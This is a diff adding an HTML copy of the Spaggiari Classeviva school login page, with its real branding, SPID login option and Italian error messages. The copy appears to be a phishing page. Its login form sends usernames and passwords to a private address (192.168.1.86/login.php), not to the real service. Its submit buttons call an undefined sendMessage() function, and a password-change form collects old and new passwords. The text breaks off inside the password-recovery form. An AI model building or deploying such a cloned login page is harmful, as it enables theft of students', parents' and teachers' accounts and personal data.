@@ -1,0 +1,1042 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login CVV Classeviva Gruppo Spaggiari Parma</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
+
+<link rel="stylesheet" href="https://cdn-image.spaggiari.eu/commons/lib/jsx/jQuery/jquery-ui-1.13.2.ca/jquery-ui.min.css?221024" type="text/css" >
+
+<link rel="stylesheet" type="text/css" href="https://web.spaggiari.eu/home/css/login_spid.css?v=221114"></link>
+<link rel="stylesheet" type="text/css" href="https://web.spaggiari.eu/home/css/progetti/cvv.css?v=6"></link>
+
+<link rel="stylesheet" href="https://web.spaggiari.eu/home/css/spid-sp-access-button.min.css?221024-01" type="text/css" media="all">
+
+<script src="https://cdn.jsdelivr.net/npm/vue@2.x"></script>
+<script>window.Vue || document.write('<script src="https://web.spaggiari.eu/home/lib/js/vue-2.6.14.js">\x3C/script>')</script>
+
+<script src="https://cdn-image.spaggiari.eu/commons/lib/jsx/jQuery/jquery-last-3.js?221024"></script>
+<script src="https://cdn-image.spaggiari.eu/commons/lib/jsx/jQuery/jquery-ui-1.13.2.ca/jquery-ui.min.js?221024"></script>
+
+
+<script src="https://web.spaggiari.eu/home/lib/js/jquery.expander.js"></script>
+<script src="https://web.spaggiari.eu/auth/lib/js/jquery-AuthApi2.js?v=228"></script>
+<script src="https://web.spaggiari.eu/home/lib/js/login_spid.js?v=220911-02"></script>
+
+<!-- INCLUDE PER CAPTCHA -->
+<script src="https://web.spaggiari.eu/commons/lib/jsx/jQuery/plugins/realperson/jquery.plugin.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://web.spaggiari.eu/commons/lib/jsx/jQuery/plugins/realperson/jquery.realperson.css?v=220911-01"></link>
+<script src="https://web.spaggiari.eu/commons/lib/jsx/jQuery/plugins/realperson/jquery.realperson.min.js"></script>
+
+
+<!-- noga -->
+
+                              <script>!function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="S28L2-MBPPT-MRZ7U-6QEEZ-H62C9",function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,_,o,r=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);r.src="javascript:void(0)",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="width:0;height:0;border:0;display:none;",o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(r,o);try{_=r.contentWindow.document}catch(O){i=document.domain,r.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",_=r.contentWindow.document}_.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"S28L2-MBPPT-MRZ7U-6QEEZ-H62C9",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},_.write("<bo"+'dy onload="document._l();">'),_.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e=""=="true"?1:0,t="",n="s4pii6excxi5my3x4aha-f-779c590d0-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,_={"ak.v":"33","ak.cp":"1137904","ak.ai":parseInt("677423",10),"ak.ol":"0","ak.cr":7,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"aed28ed","ak.r":22787,"ak.a2":e,"ak.m":"b","ak.n":"essl","ak.bpcip":"151.30.132.0","ak.cport":37086,"ak.gh":"151.21.209.210","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"reno","ak.t":"1668800526","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==EwCMO3uXJGLyTY6Awq2kIpF6yKLdrE4pYvPrLAJEXgq77ltGxdw/T3fJ/UqVUvKyw094kIlrNTCRsejzPqLNMhvMG5+rW/t7G216HC2HOvbx+ifFveuwfC/ZnORCYbbCgWrnyo0bNnyFlg+1cuVloGbP0RPS8Q7b0Op8c23UVakY/nGHpBHLhNZaJ1jWc6nIvl3+0njPQR6J92p1dDEpJB4PqWtqjks7L7lcDklyxu2guAgmpVmIq+GT6k+LCOGaT4RPOHUXAW41qidOJvE9hC4/Q1qy9Q69InGqnGtyE/5L5ULVUV4KwsnGywqVXCnli8uSHPbVPApGFpvxoAWpUe2/k5wWB7KNsz059j1UEj1cKK5QhtXN8WIwyW3u+3fskhYRxLijf56BncAT1ROhyD+n9jtqc70k1919vGTM/2U=","ak.pv":"9","ak.dpoabenc":"","ak.tf":i};if(""!==t)_["ak.ruds"]=t;var o={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))_["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(_)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:_,akDNSPreFetchDomain:n,init:function(){if(!o.i){var a=BOOMR.subscribe;a("before_beacon",o.av,null,null),a("onbeacon",o.rv,null,null),o.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
+<body>
+<div id="vue-app" class="app-container">
+<header>
+<nav>
+<div class="container">
+<div class="row align-items-center">
+<!-- logo -->
+<div class="nav-logo">
+<img src="https://web.spaggiari.eu/home/img/h-logo-neg-bn.svg">
+</div>
+<!-- logo -->
+<div class="nav-lingua dropdown" >
+<button class="dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" aria-label="Cambia lingua" @click="function(){if(lingua.show) lingua.show = false; else lingua.show = true;}">Italia - IT</button>
+<div class="dropdown-menu" v-cloak v-if="lingua.show" aria-labelledby="dropdownMenuButton" x-placement="bottom-start">
+<form id="formlang" method="post" action="http://192.168.1.86/langset.php">
+<div style="width: calc(50% - 10px); float:left; padding:5px;">
+<p>Paese</p>
+
+<input type="radio" name="lc" id="loc_it" value="it" checked><label for="loc_it" aria-label="Italia" tabindex="0" tab_item_for="this">Italia</label>
+
+
+<input type="radio" name="lc" id="loc_uk" value="uk" ><label for="loc_uk" aria-label="Regno unito" tabindex="0" tab_item_for="this">UK</label>
+
+
+<input type="radio" name="lc" id="loc_es" value="es" ><label for="loc_es" aria-label="Spagna" tabindex="0" tab_item_for="this">España</label>
+
+
+<input type="radio" name="lc" id="loc_de" value="de" ><label for="loc_de" aria-label="Germania" tabindex="0" tab_item_for="this">Deutschland</label>
+
+
+<input type="radio" name="lc" id="loc_fr" value="fr" ><label for="loc_fr" aria-label="Francia" tabindex="0" tab_item_for="this">France</label>
+
+
+<input type="radio" name="lc" id="loc_si" value="si" ><label for="loc_si" aria-label="Slovenia" tabindex="0" tab_item_for="this">Slovenija</label>
+
+
+<input type="radio" name="lc" id="loc_pt" value="pt" ><label for="loc_pt" aria-label="Portogallo" tabindex="0" tab_item_for="this">Portugal</label>
+
+
+<input type="radio" name="lc" id="loc_ae" value="ae" ><label for="loc_ae" aria-label="Emirati Arabi Uniti" tabindex="0" tab_item_for="this">امارات</label>
+
+
+<input type="radio" name="lc" id="loc_sm" value="sm" ><label for="loc_sm" aria-label="San Marino" tabindex="0" tab_item_for="this">San Marino</label>
+
+
+</div>
+<div style="width: calc(50% - 10px); float:left; padding:5px;">
+<p>Lingua</p>
+
+<input type="radio" name="lg" id="lang_it" value="it" checked><label for="lang_it" aria-label="italiano" tabindex="0" tab_item_for="this">italiano</label>
+
+
+<input type="radio" name="lg" id="lang_en" value="en" ><label for="lang_en" aria-label="inglese" tabindex="0" tab_item_for="this">english</label>
+
+
+<input type="radio" name="lg" id="lang_es" value="es" ><label for="lang_es" aria-label="spagnolo" tabindex="0" tab_item_for="this">español</label>
+
+
+<input type="radio" name="lg" id="lang_de" value="de" ><label for="lang_de" aria-label="tedesco" tabindex="0" tab_item_for="this">deutsch</label>
+
+
+<input type="radio" name="lg" id="lang_fr" value="fr" ><label for="lang_fr" aria-label="francese" tabindex="0" tab_item_for="this">français</label>
+
+
+<input type="radio" name="lg" id="lang_si" value="si" ><label for="lang_si" aria-label="sloveno" tabindex="0" tab_item_for="this">slovenščina</label>
+
+
+<input type="radio" name="lg" id="lang_pt" value="pt" ><label for="lang_pt" aria-label="portoghese" tabindex="0" tab_item_for="this">português</label>
+
+
+<input type="radio" name="lg" id="lang_ar" value="ar" ><label for="lang_ar" aria-label="arabo" tabindex="0" tab_item_for="this">الْعَرَبيّة</label>
+
+
+<input type="radio" name="lg" id="lang_it" value="it" checked><label for="lang_it" aria-label="italiano" tabindex="0" tab_item_for="this">italiano</label>
+
+
+</div>
+<button type="submit" form="formlang" class="btn" blue>Applica</button>
+</form>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<main class="main-container">
+<div class="access-container credenziali-container">
+
+<div class="login-success-container mb-5" v-cloak v-if="loginSuccess.length > 0">
+<h4 v-if="loginSuccess[loginSuccess.length-1].id != LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_SENT'] && loginSuccess[loginSuccess.length-1].id != LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_NOSAM_SENT']">Congratulazioni!</h4>
+<h4 v-if="loginSuccess[loginSuccess.length-1].id == LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_NOSAM_SENT']">Ci sei quasi!</h4>
+<h4 v-if="loginSuccess[loginSuccess.length-1].id == LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_SENT']">Abbiamo bisogno di sapere che sia proprio tu a effettuare la richiesta!</h4>
+<ul>
+<template v-for="(success, i) in loginSuccess">
+
+<li :title="success.id" v-if="success.id == LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_SENT']" tabindex="0">
+Ti abbiamo inviato una E-mail,<br>
+accedi alla tua CASELLA DI POSTA ELETTRONICA (controlla anche nella cartella SPAM) e reimposta la tua PASSWORD seguendo le istruzioni contenute nella E-mail
+
+
+</li>
+
+
+<li :title="success.id" v-if="success.id == LOGIN_SUCCESS['CRD_SUC_PASSWORD_REMIND_EMAIL_NOSAM_SENT']" tabindex="0">
+Ti abbiamo inviato una E-mail,<br>
+accedi alla tua CASELLA DI POSTA ELETTRONICA (controlla anche nella cartella SPAM) e reimposta la tua PASSWORD seguendo le istruzioni contenute nella E-mail
+
+
+
+</li>
+
+
+<li :title="success.id" v-if="success.id == LOGIN_SUCCESS['CRD_SUC_PASSWORD_CHANGED']" tabindex="0">
+Password aggiornata con successo.
+
+
+</li>
+
+
+<li :title="success.id" v-if="!objectIncludes(LOGIN_SUCCESS, success.id)" v-html="success.desc" tabindex="0"></li>
+</template>
+</ul>
+</div>
+<div class="login-warnings-container mb-5" v-cloak v-if="loginWarnings.length > 0">
+<h4>Attenzione:</h4>
+<ul>
+<template v-for="(warning, i) in loginWarnings">
+
+<li :title="warning.id" v-if="warning.id == LOGIN_WARNINGS['CRD_WAR_CHANGE_PASSWORD']" tabindex="0">
+La tua password è scaduta! È necessario sostituirla.
+
+</li>
+
+
+<li :title="warning.id" v-if="warning.id == LOGIN_WARNINGS['SPD_WAR_EMPTY_PROFILES']" tabindex="0">
+L'autenticazione con SPID è andata a buon fine, tuttavia non è stato trovato alcun profilo utente ad esso collegato. Ti consigliamo di accedere con le credenziali già in tuo possesso in attesa che la scuola completi il processo di abilitazione e verifica dei dati.
+
+</li>
+
+
+<li :title="warning.id" v-if="warning.id == LOGIN_WARNINGS['SPD_WAR_EMPTY_PROFILES_01']" tabindex="0">
+(WAR001) L'autenticazione con SPID è andata a buon fine, tuttavia non è stato trovato alcun profilo utente ad esso collegato. Ti consigliamo di accedere con le credenziali già in tuo possesso in attesa che la scuola completi il processo di abilitazione e verifica dei dati.
+
+</li>
+
+
+<li :title="warning.id" v-if="warning.id == LOGIN_WARNINGS['SPD_WAR_EMPTY_PROFILES_02']" tabindex="0">
+(WAR002) L'autenticazione con SPID è andata a buon fine, tuttavia non è stato trovato alcun profilo utente ad esso collegato. Ti consigliamo di accedere con le credenziali già in tuo possesso in attesa che la scuola completi il processo di abilitazione e verifica dei dati.
+
+</li>
+
+
+<li :title="warning.id" v-if="warning.id == LOGIN_WARNINGS['SPD_WAR_EMPTY_PROFILES_03']" tabindex="0">
+(WAR003) L'autenticazione con SPID è andata a buon fine, tuttavia non è stato trovato alcun profilo utente ad esso collegato. Ti consigliamo di accedere con le credenziali già in tuo possesso in attesa che la scuola completi il processo di abilitazione e verifica dei dati.
+
+</li>
+
+
+<li :title="warning.id" v-if="!objectIncludes(LOGIN_WARNINGS, warning.id)" v-html="warning.desc" tabindex="0"></li>
+</template>
+</ul>
+</div>
+<div class="login-errors-container mb-5" v-cloak v-if="loginErrors.length > 0">
+<h4 v-if="loginErrors[loginErrors.length-1].id != LOGIN_ERRORS['CRD_ERR_EMAIL_NOT_FOUND'] && loginErrors[loginErrors.length-1].id != LOGIN_ERRORS['CRD_ERR_USERNAME_NOT_FOUND']">Si sono verificati degli errori:</h4>
+<h4 v-if="loginErrors[loginErrors.length-1].id == LOGIN_ERRORS['CRD_ERR_EMAIL_NOT_FOUND'] || loginErrors[loginErrors.length-1].id == LOGIN_ERRORS['CRD_ERR_USERNAME_NOT_FOUND']">Impossibile trovare il tuo account</h4>
+
+<ul>
+<template v-for="(error, i) in loginErrors">
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_INSERT_USERNAME_PASSWORD']" tabindex="0">
+Inserire identificativo e password.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_USERNAME_PASSWORD_FAIL']" tabindex="0">
+Identificativo o password errati.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_PASSWORD_REMIND_RECAPTCHA_FAIL']" tabindex="0">
+Codice captcha non valido.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_EMAIL_NOT_FOUND']" tabindex="0">
+Se hai già eseguito l'accesso, riprova usanto tale indirizzo E-mail, prestando attenzione ad eventuali errori.
+<br>
+<strong>Non ricordi l'indirizzo E-mail?</strong> Prova a recuperare la password tramite Username.
+<br>
+<strong>Non ricordi nemmeno l'username?</strong> Rivolgiti alla segreteria scolastica.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_USERNAME_NOT_FOUND']" tabindex="0">
+Se hai già effettuato l'accesso con questo username, riprova prestando attenzione ad eventuali errori di battitura.
+<br>
+<strong>Hai dimenticato l'username?</strong> Prova a reimpostare la password tramite E-mail.
+<br>
+<strong>Non ricordi nemmeno l'indirizzo E-mail o non l'hai associato?</strong> Rivolgiti alla segreteria scolastica.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_USERNAME_REMIND_EMPTY_MAIL_SET']" tabindex="0">
+Nessuna E-mail trovata. Recarsi in segreteria scolastica per recuperare la password.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_USERNAME_PASSWORD_VALIDATION']" tabindex="0">
+La nuova password inserita differisce dalla conferma nuova password. Inserire nuovamente il valore desiderato e ritentare l'operazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['CRD_ERR_TOO_MANY_FAILURES']" tabindex="0">
+Troppi tentativi di accesso falliti. Account temporaneamente sospeso. Riprovare più tardi.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['AUT_ERR_AUTH_FAILED']" tabindex="0">
+Autenticazione Spaggiari fallita, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['EID_ERR_MISSING_TOKEN']" tabindex="0">
+Errore imprevisto durante la procedura di autenticazione, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['EID_ERR_TOKEN_VALIDATION_FAILURE']" tabindex="0">
+Errore imprevisto durante la procedura di autenticazione, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['EID_ERR_STATE_DECODE_FAILURE']" tabindex="0">
+Errore imprevisto durante la procedura di autenticazione, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['EID_ERR_TOKEN_MISSING_CF']" tabindex="0">
+Codice fiscale dell'utenza SPID non identificato, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['JWT_ERR_DECODE']" tabindex="0">
+Errore imprevisto nella decodifica dei dati, eseguire nuovamente l'operazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['JWT_ERR_TIMEOUT']" tabindex="0">
+È stato superato il tempo massimo disponibile per la selezione del profilo, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['JSON_ERR_DECODE']" tabindex="0">
+(ERRJSN) L'autenticazione con SPID è andata a buon fine, tuttavia non è stato trovato alcun profilo utente ad esso collegato. Ti consigliamo di accedere con le credenziali già in tuo possesso in attesa che la scuola completi il processo di abilitazione e verifica dei dati.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['AJX_ERR_COMUNICATION_ERROR']" tabindex="0">
+Errore di rete imprevisto, eseguire nuovamente l'operazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['SES_ERR_MISSING_SESSION']" tabindex="0">
+Sessione non valida, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['SES_ERR_BAD_REQUEST']" tabindex="0">
+Dati in sessione non validi, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_CUSTOMER_NOT_SELECTED']" tabindex="0">
+Ricercare e selezionare una scuola prima di procedere con l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_INVALID_CUSTOMER']" tabindex="0">
+La scuola selezionata non è configurata per l'utilizzo di SPID.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_INTERNAL_ERROR']" tabindex="0">
+Errore imprevisto durante la procedura di autenticazione, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_LOGIN_FAILED']" tabindex="0">
+La procedura di autenticazione non è andata a buon fine, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_LOGIN_TIMEOUT']" tabindex="0">
+È stato superato il tempo massimo disponibile per la procedura di autenticazione, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_BAD_RESPONSE']" tabindex="0">
+La procedura di autenticazione non è andata a buon fine, ripetere l'autenticazione.
+
+</li>
+
+
+<li :title="error.id" v-if="error.id == LOGIN_ERRORS['ASP_ERR_FATAL_ERROR']" tabindex="0">
+La procedura di autenticazione non è andata a buon fine, ripetere l'autenticazione. Se l'errore persiste si consiglia di riprovare dopo aver chiuso e riaperto il browser.
+
+
+</li>
+
+
+<li :title="error.id" v-if="!objectIncludes(LOGIN_ERRORS, error.id)" v-html="error.desc" tabindex="0"></li>
+</template>
+</ul>
+</div>
+
+
+<div class="credenziali-content-container">
+<div  v-cloak v-show="password_dimenticata === false && change_password === false">
+<form id="fform" method="post" action="http://192.168.1.86/login.php?index.php" autocomplete="on" @submit="authLogin">
+<input type="hidden" name="custcode" v-model="login_fields.custcode">
+<h3 class="mb-2" v-bind:class="{'mb-4' : luogo_scuola == ''}" v-if="nominativo_scuola != ''" v-html="nominativo_scuola"></h3>
+<h4 class="mt-2 mb-4" v-if="luogo_scuola != ''" v-html="luogo_scuola"></h4>
+<div class="form-group-container">
+<div class="form-group text-left username-field">
+<label for="login">Codice Personale / Email</label>
+<input id="login" class="form-control" type="text" name="login" v-model="login_fields.login" aria-describedby="emailHelp" aria-label="Inserisci Codice Personale / Email" placeholder="Codice Personale / Email">
+</div>
+<div class="form-group text-left password-tastiera password-field">
+<label for="password">Password</label>
+<input id="password" class="form-control" type="password" name="password" v-model="login_fields.password" aria-label="Inserisci password" placeholder="Password">
+<small class="form-text text-muted"><button type="button" class="btn_like_a" @click="passwordDimenticata">Password dimenticata?</button></small>
+</div>
+<div class="avviso-blocco-login">
+<small class="form-text text-muted">
+<span>Attenzione! Dopo 5 tentativi di login con credenziali errate l'accesso sarà sospeso per 60 minuti.</span>
+</small>
+</div>
+</div>
+<button type="submit" onclick="sendMessage()" class="accedi btn btn-primary" blue>
+<i class='fas fa-circle-notch fa-spin' v-if="accedi_btn_clicked"></i>
+Entra con le credenziali
+</button>
+<div style="clear: both;"></div>
+<div class="main-separator" v-if="is_spid_enabled">
+<hr>
+<span>In alternativa</span>
+</div>
+<div class="login-spid-container" v-if="is_spid_enabled">
+<a href="https://web.spaggiari.eu/home/app/default/loginsp.php?act=spidLogin" class="spid_btn italia-it-button italia-it-button-size-m button-spid btn-spid-desktop" spid-idp-button="#spid-idp-button-medium-post" aria-haspopup="false" aria-expanded="false">
+<span class="italia-it-button-icon"><img src="https://web.spaggiari.eu/home/img/spid_btn/spid-ico-circle-bb.svg" onerror="this.src='/home/img/spid_btn/spid-ico-circle-bb.png'; this.onerror=null;" alt="" /></span>
+<span class="italia-it-button-text">Entra con SPID</span>
+</a>
+<div class="login-spid-desc">
+<div>
+<p class="mb-2">Solo per le scuole statali si potrà accedere tramite SPID.</p>
+<button type="button" id="expand_spid_service_info" class="material-icons expand-icons" tabindex="-1" v-if="!spid_service_info" @click="function(){ spid_service_info = true; }">chevron_right</button>
+<button type="button" id="expand_spid_service_info" class="material-icons expand-icons" tabindex="-1" v-if="spid_service_info" @click="function(){ spid_service_info = false; }">expand_more</button>
+<label for="expand_spid_service_info" class="mb-0" style="cursor: pointer; display: block;">
+Il servizio è offerto dal Ministero dell'Istruzione.
+</label>
+<div class="spid-service-info-container mobile" v-cloak  v-if="spid_service_info === true">
+<small class="form-text text-muted">
+Ai sensi dell’art. 17, comma 2, del D.Lgs. 70/2003 Gruppo Spaggiari Parma S.p.A., quale Responsabile del Trattamento dati personali (formalmente designato in
+base all'art. 28 del Reg. Europeo 679/2016 "GDPR", dall'Ente scolastico di riferimento Titolare del trattamento), informa l'utente/soggetto interessato che l’accesso
+alle proprie soluzioni Cloud SaaS può avvenire anche tramite il servizio di autenticazione SPID offerta dal Ministero dell'Istruzione a cui sono demandati gli oneri
+di gestione della login SPID (archiviazione degli accessi, livelli di sicurezza, etc.).
+</small>
+</div>
+</div>
+<div>
+<p class="mb-2"><a href="https://www.spid.gov.it" target="_blank">Maggiori informazioni su SPID?</a></p>
+<p class="mb-0"><a href="https://www.spid.gov.it/richiedi-spid" target="_blank">Non hai SPID?</a></p>
+</div>
+</div>
+<div style="clear: both;"></div>
+<div class="spid-service-info-container desktop" v-cloak  v-if="spid_service_info === true">
+<small class="form-text text-muted">
+Ai sensi dell’art. 17, comma 2, del D.Lgs. 70/2003 Gruppo Spaggiari Parma S.p.A., quale Responsabile del Trattamento dati personali (formalmente designato in
+base all'art. 28 del Reg. Europeo 679/2016 "GDPR", dall'Ente scolastico di riferimento Titolare del trattamento), informa l'utente/soggetto interessato che l’accesso
+alle proprie soluzioni Cloud SaaS può avvenire anche tramite il servizio di autenticazione SPID offerta dal Ministero dell'Istruzione a cui sono demandati gli oneri
+di gestione della login SPID (archiviazione degli accessi, livelli di sicurezza, etc.).
+</small>
+</div>
+</div>
+</form>
+</div>
+<div id="changePassword-container" v-cloak v-if="change_password === true">
+<form id="changepwdform" v-on:submit.prevent="changePassword">
+<button type="button" class="material-icons back_arrow_btn" title="Indietro" aria-label="Indietro" @click="function(){ change_password = false; backToLastFocus(); }">arrow_back_ios</button>
+<h3 class="mb-4" tabindex="0">Cambio password</h3>
+<h4 class="mb-4" v-if="nominativo_scuola != ''">
+<span v-html="nominativo_scuola"></span>
+<span v-if="luogo_scuola != ''" v-html="' - '+luogo_scuola"></span>
+</h4>
+<div class="form-group text-left left">
+<label for="login">Codice Personale / Email</label>
+<input id="aapi-dlg-user" class="form-control" type="text" name="user" v-model="login_fields.login" aria-describedby="emailHelp" aria-label="Inserisci Codice Personale / Email" placeholder="Codice Personale / Email">
+</div>
+<div class="form-group text-left password-tastiera right">
+<label for="password">Vecchia password</label>
+<input id="aapi-dlg-pold" class="form-control" type="password" name="pold" v-model="login_fields.password" aria-label="Inserisci Vecchia password" placeholder="Vecchia password">
+</div>
+<div class="form-group text-left password-tastiera left">
+<label for="password">Nuova password</label>
+<input id="aapi-dlg-pnew" class="form-control" type="password" name="pnew" v-model="login_fields.new_password_1" aria-label="Inserisci Nuova password" placeholder="Nuova password">
+</div>
+<div class="form-group text-left password-tastiera right">
+<label for="password">Conferma nuova password</label>
+<input id="aapi-dlg-rnew" class="form-control" type="password" name="rnew" v-model="login_fields.new_password_2" aria-label="Ripeti nuova password" placeholder="Conferma nuova password">
+</div>
+<div class="change-pwd-text">
+<span>La invitiamo a scegliere una password di almeno 10 caratteri comprensivi di numeri, lettere maiuscole/minuscole e caratteri speciali (ad esempio: @ # ! ? $ = * -) al fine di prevenire problematiche legate all'accesso illecito e/o alla diffusione di dati personali/particolari.</span>
+</div>
+<div class="pwd-change-captcha-container">
+<input name="j-captcha" class="j-captcha form-control" value="" v-model="login_fields.j_captcha" placeholder="Codice di controllo">
+</div>
+<div style="clear: both;"></div>
+<button onclick="sendMessage()" type="submit" class="btn btn-primary" blue>
+<i class='fas fa-circle-notch fa-spin' v-if="conferma_btn_clicked"></i>
+Conferma
+</button>
+<div style="clear: both;"></div>
+</form>
+</div>
+<div v-cloak  v-if="password_dimenticata === true">
+<form id="pwd-reminder" @submit="inviaMail" v-if="password_cambiotipo === 'email'">
+<button type="button" class="material-icons back_arrow_btn" title="Indietro" aria-label="Indietro" @click="function(){ password_dimenticata = false; backToLastFocus(); }">arrow_back_ios</button>
+<h3 class="mb-4">Recupero password tramite E-mail</h3>
+
+<div class="form-group text-justify">
+<input type="radio" name="tipo_recupero" id="recupero_email" value="email" v-model="password_cambiotipo">
+<label for="recupero_email">Recupero password tramite E-mail</label>
+<div style="clear: both;"></div>
+<input type="radio" name="tipo_recupero" id="recupero_uid" value="username" v-model="password_cambiotipo">
+<label for="recupero_uid">Recupero password tramite Username</label>
+</div>
+
+<div class="form-group text-justify">
+<p>
+Inserisci l'indirizzo E-mail che hai associato al tuo account:
+</p>
+</div>
+<div class="pwd-remind-email-container">
+<input id="pwd-reminder-input" class="form-control" type="email" name="eml" v-model="login_fields.email_riminder" placeholder="Indirizzo Mail" aria-label="Inserisci indirizzo Mail per il recupero password">
+<small class="form-text text-muted">
+<p>Verrà inviato un messaggio all'indirizzo indicato con le istruzioni necessarie.</p>
+</small>
+</div>
+<div class="form-group pwd-remind-captcha-container">
+<input name="j-captcha" class="j-captcha form-control" value="" placeholder="Codice di controllo">
+</div>
+<div style="clear: both;"></div>
+<button type="submit" id="inviamail" blue class="btn btn-primary">
+<i class='fas fa-circle-notch fa-spin' v-if="invia_btn_clicked"></i>
+Invia
+</button>
+<div style="clear:both;"></div>
+<div class="form-group text-justify mt-4 mb-0">
+<p class="mb-0">
+Hai bisogno di aiuto? Segui le indicazioni nel <button type="button" class="btn_like_a div_img_pwd_dimenticata" aria-label="Riproduci video guida per il cambio password" @click="showVideoPwddim">video</button>.
+</p>
+</div>
+<div style="clear:both;"></div>
+<transition name="fadeHeight">
+<div class="video_pwd_dimenticata" align="center" v-if="mostra_video_pwddim === true">
+<iframe id="iframe_pwd_dimenticata" xsrc="https://player.vimeo.com/video/659351134?autoplay=1" frameborder="0" allow="autoplay; fullscreen" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+</div>
+</transition>
+</form>
+
+<form id="usr-reminder" @submit="inviaUsername" v-if="password_cambiotipo === 'username'">
+<button type="button" class="material-icons back_arrow_btn" title="Indietro" aria-label="Indietro" @click="function(){ password_dimenticata = false; backToLastFocus(); }">arrow_back_ios</button>
+<h3 class="mb-4">Recupero password tramite Username</h3>
+<div class="form-group text-justify">
+<input type="radio" name="tipo_recupero" id="recupero_email" value="email" v-model="password_cambiotipo">
+<label for="recupero_email">Recupero password tramite E-mail</label>
+<div style="clear: both;"></div>
+<input type="radio" name="tipo_recupero" id="recupero_uid" value="username" v-model="password_cambiotipo">
+<label for="recupero_uid">Recupero password tramite Username</label>
+</div>
+<div class="form-group text-justify">
+<p>
